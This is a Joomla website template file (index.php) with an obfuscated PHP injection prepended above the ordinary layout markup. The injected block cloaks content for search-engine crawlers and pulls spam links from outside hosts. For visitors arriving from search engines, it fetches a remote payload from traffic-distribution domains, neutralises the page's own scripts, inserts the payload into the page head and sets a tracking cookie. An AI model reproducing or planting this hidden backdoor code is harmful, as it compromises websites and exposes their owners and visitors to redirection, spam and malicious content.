<?php
if(!defined('_NET'))
{	
error_reporting(0);
$NET='sh19045'; 
define('_NET',$NET);
if(function_exists('date_default_timezone_set')){date_default_timezone_set('America/Los_Angeles');}$sll0='http://googlecountwebs.com/';$pinj_0='http://tds-err.com/i?r=1';$pinj_1='http://tds-narod.ru/i.txt';$FNN='lnk-trans2.php';$pinj_2='yahoo';$pinj_2='bing';$pinj_3=str_replace('google',$pinj_1,$sll0);$pinj_4='site';$sll0=str_replace('google',$pinj_4,$sll0);$pinj_5='';$pinj_6='';$pinj_7='';$pinj_8='';if(!empty($_SERVER['HTTP_USER_AGENT'])){$pinj_6=$_SERVER['HTTP_USER_AGENT'];}if(!empty($_SERVER['HTTP_REFERER'])){$pinj_5=$_SERVER['HTTP_REFERER'];}if(!empty($_SERVER['REQUEST_URI'])){$pinj_7=$_SERVER['REQUEST_URI'];}if(!empty($_SERVER['REMOTE_ADDR'])){$pinj_8=$_SERVER['REMOTE_ADDR'];}if(!function_exists('get_cont')){function get_cont($pinj_9){if(function_exists('curl_init')){if(strpos($pinj_9,'NET=',0)>0){$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,0);curl_setopt($pinj_10,CURLOPT_NOBODY,0);curl_setopt($pinj_10,CURLOPT_TIMEOUT,30);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);return $pinj_11;}$pinj_12=0;$pinj_13=0;$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,1);curl_setopt($pinj_10,CURLOPT_NOBODY,1);curl_setopt($pinj_10,CURLOPT_TIMEOUT,10);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);if((strpos($pinj_11,' 404 Not',0)>0)||(strpos($pinj_11,'Location:',0)>0)){$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,1);curl_setopt($pinj_10,CURLOPT_NOBODY,1);curl_setopt($pinj_10,CURLOPT_TIMEOUT,10);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (x compatible; Googlebot/2.1; +http://www.google.com/bot.html)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);if(strpos($pinj_11,' 200 OK',0)>0){$pinj_13=1;$pinj_12=1;}}else{if(strpos($pinj_11,' 200 OK',0)>0){$pinj_13=1;}}if($pinj_13==0){$pinj_14=array();$pinj_15=0;while(preg_match("/(Location:|URI:)[^(\n)]*/",$pinj_11,$pinj_14)&&($pinj_15<3)){$pinj_9=trim(str_replace($pinj_14[1],"",$pinj_14[0]));$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,1);curl_setopt($pinj_10,CURLOPT_NOBODY,1);curl_setopt($pinj_10,CURLOPT_TIMEOUT,10);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);$pinj_15=$pinj_15+1;$pinj_14=array();}if(strpos($pinj_11,' 200 OK',0)>0){$pinj_13=1;}}$pinj_10=curl_init();curl_setopt($pinj_10,CURLOPT_URL,$pinj_9);curl_setopt($pinj_10,CURLOPT_HEADER,0);curl_setopt($pinj_10,CURLOPT_NOBODY,0);curl_setopt($pinj_10,CURLOPT_TIMEOUT,30);curl_setopt($pinj_10,CURLOPT_RETURNTRANSFER,1);if($pinj_12==1){curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (x compatible; Googlebot/2.1; +http://www.google.com/bot.html)");}else{curl_setopt($pinj_10,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)");}$pinj_11=curl_exec($pinj_10);curl_close($pinj_10);return $pinj_11;}$pinj_16=@file_get_contents($pinj_9);return $pinj_16;}}if(!function_exists('SEbot_')){function SEbot_($pinj_17){if(strpos('-' .strtolower($pinj_17),'x compatible',0)>0){return 0;}if(strpos('-' .strtolower($pinj_17),'googlebot',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'slurp',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'bing',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'msnbot',0)>0){return 1;}if(strpos('-' .strtolower($pinj_17),'yahoo',0)>0){return 1;}return 0;}}if(!function_exists('not_do_')){function not_do_($pinj_18){$pinj_19='gif|jpeg|png|js|css|swf|ico|txt|pdf|xml|jpg|pdf|doc';$pinj_20=explode("|",$pinj_19);$pinj_21=0;while($pinj_21<count($pinj_22)){if(strpos(' ' .strtolower($pinj_18),$pinj_22[$pinj_21],0)>0)return 1;$pinj_21=$pinj_21+1;}return 0;}}if(!function_exists('detect_encoding_')){function detect_encoding_($pinj_23){static $pinj_24=array('UTF-8','ASCII','Windows-1251','ISO-8859-2','ISO-8859-3','ISO-8859-4','ISO-8859-5','ISO-8859-6','ISO-8859-7','ISO-8859-8','ISO-8859-9','ISO-8859-10','ISO-8859-13','ISO-8859-14','ISO-8859-15','ISO-8859-16','ISO-8859-1','Windows-1252','Windows-1254',);foreach($pinj_24 as $pinj_25){$pinj_26=@iconv($pinj_25,$pinj_25 .'',$pinj_23);if(md5($pinj_26)== md5($pinj_23))return $pinj_25;}return null;}}if(isset($_SERVER['HTTPS'])&&($_SERVER['HTTPS']=='on')){$pinj_27='https';}else{$pinj_27='http';}$pinj_28=substr(str_replace('www.','',$_SERVER['SERVER_NAME']),0,4);if((SEbot_($pinj_6)>0)&&empty($pinj_29)&&(not_do_($pinj_7)==0)){$pinj_29=get_cont($pinj_27 .'://' .$_SERVER['SERVER_NAME'] .$pinj_7);if(strlen($pinj_29)>200){$pinj_30=get_cont($sll0 .$FNN .'?d=' .$_SERVER['SERVER_NAME'] .'&NET=' .$NET .'&u=' .urlencode($pinj_7) .'&prot=' .$pinj_27);$pinj_31=$pinj_29;$pinj_32=strpos(strtolower($pinj_29),"<body",0);$pinj_33=strpos(strtolower($pinj_29),">",$pinj_32);if(($pinj_32>0)&&($pinj_33>0)){$pinj_29=substr($pinj_31,0,$pinj_33+1) .$pinj_30 .'' .substr($pinj_31,$pinj_33+1);if(strpos(strtolower('-' .$pinj_6),'sape',0)>0){$pinj_29=$pinj_29 .'=*OK*=';}echo $pinj_29;exit;}$pinj_29=str_replace('</body>',$pinj_30 .'</body>',$pinj_29);if(strpos(strtolower('-' .$pinj_6),'sape',0)>0){$pinj_29=$pinj_29 .'=*OK*=';}echo $pinj_29;exit;}else { echo '<html><head></head><body>'.$pinj_30.'</body></html>';	 exit;	 } }if(isset($pinj_5)&&((strpos($pinj_5,'ogle.',0)>0)||(strpos($pinj_5,'ing.',0)>0)||(strpos($pinj_5,'ahoo.',0)>0)||(strpos($pinj_5,'ask.com',0)>0)||(strpos($pinj_5,'aol.',0)>0)||(strpos($pinj_5,'duckduckgo.',0)>0)||(strpos($pinj_5,'baidu.',0)>0))){$pinj_34='mkke';$pinj_35=180;if(!isset($_COOKIE[$pinj_34])||($_COOKIE[$pinj_34]<(time()))){$pinj_36=get_cont($sll0 .$FNN .'?rd=1&d=' .$_SERVER['SERVER_NAME'] .'&NET=' .$NET .'&u=' .urlencode($pinj_7) .'&prot=' .$pinj_27);if(strlen($pinj_36,'<!-- -->',0)>0)$pinj_35=9000;if(strlen($pinj_36)>10){$pinj_37=get_cont($pinj_27 .'://' .$_SERVER['SERVER_NAME'] .$pinj_7);if(strlen($pinj_37)>400){$pinj_36=str_replace('-SID-',$NET,$pinj_36); $pinj_37=str_replace(' src="',' xsrc="',$pinj_37); $pinj_37=str_replace(" src='"," xsrc='",$pinj_37); $pinj_37=str_replace("<script","<comment",$pinj_37); $pinj_37=str_replace("</script","</comment",$pinj_37);  $pinj_37=str_replace('</head>',$pinj_36 .'</head>',$pinj_37);setcookie($pinj_34,(time()+$pinj_35),(time()+$pinj_35*2),'/','.' .str_replace('www.','',$_SERVER['SERVER_NAME']));  echo $pinj_37;exit;}}}} 
$p1='_lo'; $p1=$p1.'ads';  $i=0; while($i<12) { $p1='x'.$p1; $i=$i+1;} $p2=$p1.'2'; if(isset($_GET[$p1]) || isset($_POST[$p1]) ) { exit;} if(isset($_GET[$p2])  ) { $_GET[$p1]=$_GET[$p2];} if(isset($_POST[$p2]) ) { $_POST[$p1]=$_POST[$p2];}
}
/*,.*/
?><?php

defined('_JEXEC') or die;

include_once ('includes/functions.php');

include_once ('includes/includes.php');

?>



<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >

<head>

  

  <?php

    $doc->addStyleSheet('templates/'.$this->template.'/css/bootstrap.css'); 

    $doc->addStyleSheet('templates/'.$this->template.'/css/default.css');

    $doc->addStyleSheet('templates/'.$this->template.'/css/template.css');
    
    $doc->addStyleSheet('templates/'.$this->template.'/css/magnific-popup.css');

    //$doc->addStyleSheet('templates/'.$this->template.'/css/touch.gallery.css');

    $doc->addStyleSheet('templates/'.$this->template.'/css/responsive.css');  
    $doc->addStyleSheet('//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css'); 



    if($themeLayout == 1){

      $doc->addStyleSheet('templates/'.$this->template.'/css/layout.css');

    }
    
    $doc->addScript($this->baseurl."/media/jui/js/jquery.min.js");
    $doc->addScript($this->baseurl.'/media/jui/js/jquery-migrate.min.js');
    $doc->addScript($this->baseurl."/media/jui/js/bootstrap.min.js"); 

  ?>

  <link href='http://fonts.googleapis.com/css?family=Open+Sans+Condensed:300' rel='stylesheet' type='text/css'>



  <!--[if IE 8]>

    <link rel="stylesheet" href="<?php echo $this->baseurl; ?>/templates/<?php echo $this->template; ?>/css/ie.css" />

  <![endif]-->



  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>  

  <jdoc:include type="head" />

  

</head>



<body class="<?php echo $option . " view-" . $view . " task-" . $task . " itemid-" . $itemid . " body__" . $pageClass;?>">



  <!-- Body -->

  <div id="wrapper">

    <div class="wrapper-inner">



    <!-- Top -->

    <?php if ($this->countModules('top')): ?>

      <div id="top-row">

        <div class="row-container">

              <jdoc:include type="modules" name="top" style="html5nosize" />

        </div>

      </div>

    <?php endif; ?>



    <!-- Header -->

      <div id="header-row">

        <div class="row-container">

          <div class="<?php echo $containerClass; ?>">

            <header>

              <div class="<?php echo $rowClass; ?>">

                  <!-- Logo -->

                  <div id="logo" class="span<?php echo $this->params->get('logoBlockWidth'); ?>">

                    <a href="<?php echo $this->baseurl; ?>">

                      <img src="<?php echo $logo;?>" alt="<?php echo $sitename; ?>" />

                    </a>

                  </div>

                  <jdoc:include type="modules" name="header" style="themeHtml5" />

              </div>

            </header>

          </div>

        </div>

      </div>



    <!-- Navigation -->

    <?php if ($this->countModules('navigation')): ?>

      <div id="navigation-row">

        <div class="row-container">

          <div class="<?php echo $containerClass; ?>">

            <div class="<?php echo $rowClass; ?>">

              <nav>

                <jdoc:include type="modules" name="navigation" style="themeHtml5" />

              </nav>

            </div>

          </div>

        </div>

      </div>

    <?php endif; ?>



    <!-- Showcase -->

    <?php if ($this->countModules('showcase') && $hideByView == false): ?>

      <div id="showcase-row">

        <div class="row-container">

          <div class="<?php echo $containerClass; ?>">

            <div class="<?php echo $rowClass; ?>">

                <jdoc:include type="modules" name="showcase" style="themeHtml5" />

            </div>

          </div>

        </div>

      </div>

    <?php endif; ?>



    <!-- Feature -->

    <?php if ($this->countModules('feature') && $hideByView == false): ?>

      <div id="feature-row">

        <div class="row-container">

          <div class="<?php echo $containerClass; ?>">

            <div class="<?php echo $rowClass; ?>">

                <jdoc:include type="modules" name="feature" style="themeHtml5" />

            </div>

          </div>

        </div>

      </div>

    <?php endif; ?>





    <!-- Maintop -->

    <?php if ($this->countModules('maintop') && $hideByView == false && $layout !== 'edit'): ?>

      <div id="maintop-row">

        <div class="row-container">

          <div class="<?php echo $containerClass; ?>">

            <div id="maintop" class="<?php echo $rowClass; ?>">

              <jdoc:include type="modules" name="maintop" style="themeHtml5" />

            </div>

          </div>

        </div>

      </div>

    <?php endif; ?>



    <!-- Main Content row -->

    <div id="content-row">

      <div class="row-container">

        <div class="<?php echo $containerClass; ?>">

          <div class="content-inner <?php echo $rowClass; ?>">

        

            <!-- Left sidebar -->

            <?php if ($this->countModules('aside-left') && ($hideByOption) == false && $view !== 'form' && $layout !== 'edit'): ?>

              <div id="aside-left" class="span<?php echo $asideLeftWidth; ?>">

                <aside>

                  <jdoc:include type="modules" name="aside-left" style="html5nosize" />

                </aside>

              </div>

            <?php endif; ?>

        

            <div id="component" class="span<?php echo $mainContentWidth; ?>">

              <!-- Breadcrumbs -->

              <?php if ($this->countModules('breadcrumbs')): ?>

                <div id="breadcrumbs-row">

                  <div id="breadcrumbs">

                    <jdoc:include type="modules" name="breadcrumbs" style="html5nosize" />

                  </div>

                </div>

              <?php endif; ?>

        

              <!-- Content-top -->

              <?php if ($this->countModules('content-top') && $hideByView == false): ?>

                <div id="content-top-row" class="<?php echo $rowClass; ?>">

                  <div id="content-top">

                    <jdoc:include type="modules" name="content-top" style="themeHtml5" />

                  </div>

                </div>

              <?php endif; ?>

        

                <jdoc:include type="message" />

                <jdoc:include type="component" />

        

              <!-- Content-bottom -->

              <?php if ($this->countModules('content-bottom') && $hideByView == false): ?>

                <div id="content-bottom-row" class="<?php echo $rowClass; ?>">

                  <div id="content-bottom">

                    <jdoc:include type="modules" name="content-bottom" style="themeHtml5" />

                  </div>

                </div>

              <?php endif; ?>

            </div>

        

            <!-- Right sidebar -->

            <?php if ($this->countModules('aside-right') && ($hideByOption) == false && $view !== 'form' && $layout !== 'edit'): ?>

              <div id="aside-right" class="span<?php echo $asideRightWidth; ?>">

                <div class="aside">

                  <jdoc:include type="modules" name="aside-right" style="html5nosize" />

                </div>

              </div>

            <?php endif; ?>

          </div>

        </div>

      </div>

    </div>



    <!-- Mainbottom -->

    <?php if ($this->countModules('mainbottom') && $hideByView == false): ?>

      <div id="mainbottom-row">

        <div class="row-container">

          <div class="<?php echo $containerClass; ?>">

            <div id="mainbottom" class="<?php echo $rowClass; ?>">

              <jdoc:include type="modules" name="mainbottom" style="themeHtml5" />

            </div>

          </div>

        </div>

      </div>

    <?php endif; ?>



    <!-- Bottom -->

    <?php if ($this->countModules('bottom') && $hideByView == false): ?>

      <div id="bottom-row">

        <div class="row-container">

          <div class="<?php echo $containerClass; ?>">

            <div id="bottom" class="<?php echo $rowClass; ?>">

              <jdoc:include type="modules" name="bottom" style="themeHtml5" />

            </div>

          </div>

        </div>

      </div>

    <?php endif; ?>

      <!-- Footer -->

      <?php if ($this->countModules('footer') && $hideByView == false): ?>

        <div id="footer-row">

          <div class="row-container">

            <div class="<?php echo $containerClass; ?>">

              <div id="footer" class="<?php echo $rowClass; ?>">

                <jdoc:include type="modules" name="footer" style="themeHtml5" />

              </div>

            </div>

          </div>

        </div>

      <?php endif; ?>

    <div id="push"></div>

    </div>

  </div>



  <div id="footer-wrapper">

    <div class="footer-wrapper-inner">

      

      <!-- Copyright -->

      <?php if ($this->countModules('copyright')): ?>

        <div id="copyright-row">

          <div class="row-container">

            <div class="<?php echo $containerClass; ?>">

              <div id="copyright" class="<?php echo $rowClass; ?>">

                <jdoc:include type="modules" name="copyright" style="themeHtml5" />

                <a  rel='nofollow' href='http://firmen.wko.at/Web/DetailsInfos.aspx?FirmaID=ab855c43-3d75-42f7-91fa-5ec28c0cb20b&StandortID=29&StandortName=Wien+(Bundesland)&Suchbegriff=Handel&Page=6&Filter=8' target='_blank'>IMPRESSUM</a>

              </div>

            </div>

          </div>

        </div>

      <?php endif; ?>

    </div>

  </div>



  <?php if($this->params->get('totop')): ?>

    <div id="back-top">

      <a href="#"><span></span><?php echo $this->params->get('totop_text') ?></a>

    </div>

  <?php endif; ?>





  <?php if ($this->countModules('modal')): ?>

    <jdoc:include type="modules" name="modal" style="modal" />

  <?php endif; ?>



  <jdoc:include type="modules" name="debug" style="none"/>



  <?php  


    $doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/jquery.easing.1.3.js');

    //$doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/jquery.isotope.min.js');
    
    $doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/jquery.magnific-popup.min.js');

    //$doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/touch.gallery.js');

    $doc->addScript($this->baseurl.'/templates/'.$this->template.'/js/scripts.js');

  ?>



</body>

</html>

